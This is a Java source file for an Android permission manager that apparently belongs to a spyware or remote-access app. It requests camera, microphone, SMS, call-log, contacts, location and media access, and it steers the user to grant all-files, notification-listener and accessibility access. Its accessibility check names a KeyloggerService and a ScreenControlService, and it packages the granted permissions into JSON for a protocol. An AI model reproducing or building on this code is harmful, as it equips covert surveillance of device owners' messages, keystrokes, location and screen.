package com.fason.app.core.permissions;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public final class PermissionManager {

    private PermissionManager() {}

    public static String[] getRequiredPerms() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.SEND_SMS);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_CONTACTS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            perms.add(Manifest.permission.FOREGROUND_SERVICE_LOCATION);
            perms.add(Manifest.permission.FOREGROUND_SERVICE_CAMERA);
            perms.add(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE);
            perms.add(Manifest.permission.FOREGROUND_SERVICE_SPECIAL_USE);
        }

        return perms.toArray(new String[0]);
    }

    public static void requestPerms(Activity act, int reqCode) {
        List<String> needed = new ArrayList<>();
        for (String p : getRequiredPerms()) {
            if (!isGranted(act, p)) needed.add(p);
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(act, needed.toArray(new String[0]), reqCode);
        }
    }

    public static boolean isGranted(Context ctx, String perm) {
        if (perm == null) return false;
        return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasAllPerms(Context ctx) {
        for (String p : getRequiredPerms()) {
            if (!isGranted(ctx, p)) return false;
        }
        return true;
    }

    public static List<String> getDeniedPerms(Context ctx) {
        List<String> denied = new ArrayList<>();
        for (String p : getRequiredPerms()) {
            if (!isGranted(ctx, p)) denied.add(p);
        }
        return denied;
    }

    public static boolean hasStorageManager() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        }
        return true;
    }

    public static void requestStorageManager(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                i.setData(Uri.parse("package:" + ctx.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Exception e) {
                try {
                    Intent i = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(i);
                } catch (Exception ignored) {}
            }
        }
    }

    public static boolean hasBatteryExemption(Context ctx) {
        PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        return pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
    }

    public static void requestBatteryExemption(Activity act) {
        if (!hasBatteryExemption(act)) {
            try {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(Uri.parse("package:" + act.getPackageName()));
                act.startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    public static boolean hasNotifAccess(Context ctx) {
        String listeners = Settings.Secure.getString(ctx.getContentResolver(), Protocol.SETTING_NOTIF_LISTENERS);
        return listeners != null && listeners.contains(ctx.getPackageName());
    }

    public static void requestNotifAccess(Context ctx) {
        if (!hasNotifAccess(ctx)) {
            try {
                Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    public static boolean hasAccessibility(Context ctx) {
        String enabledServices = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        if (enabledServices == null) return false;
        String pkg = ctx.getPackageName();
        return enabledServices.contains(pkg + "/.features.screen.ScreenControlService") ||
               enabledServices.contains(pkg + "/.features.keylogger.KeyloggerService");
    }

    public static void requestAccessibility(Context ctx) {
        if (!hasAccessibility(ctx)) {
            try {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    public static void openAppSettings(Context ctx) {
        try {
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            i.setData(Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    /** Check if permission is granted (uses FasonApp context). */
    public static boolean canIUse(String perm) {
        try {
            return isGranted(FasonApp.getContext(), perm);
        } catch (Exception e) {
            return false;
        }
    }

    /** Check if all runtime permissions are granted (uses FasonApp context). */
    public static boolean hasAllPerms() {
        try {
            return hasAllPerms(FasonApp.getContext());
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean hasRestrictedPerms(Context ctx) {
        return !hasAllPerms(ctx);
    }

    public static JSONObject getGranted() {
        JSONObject data = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            JSONArray perms = new JSONArray();
            for (String p : getRequiredPerms()) {
                if (isGranted(ctx, p)) perms.put(p);
            }
            data.put(Protocol.KEY_PERMISSIONS, perms);
        } catch (Exception e) {
            try { data.put(Protocol.KEY_ERROR, e.getMessage()); } catch (Exception ignored) {}
        }
        return data;
    }

    public static boolean needsAutoStart(Context ctx) {
        return OemAutoStartHelper.isAutoStartNeeded(ctx);
    }

    public static void requestAutoStart(Activity act) {
        OemAutoStartHelper.requestAutoStart(act);
    }
}
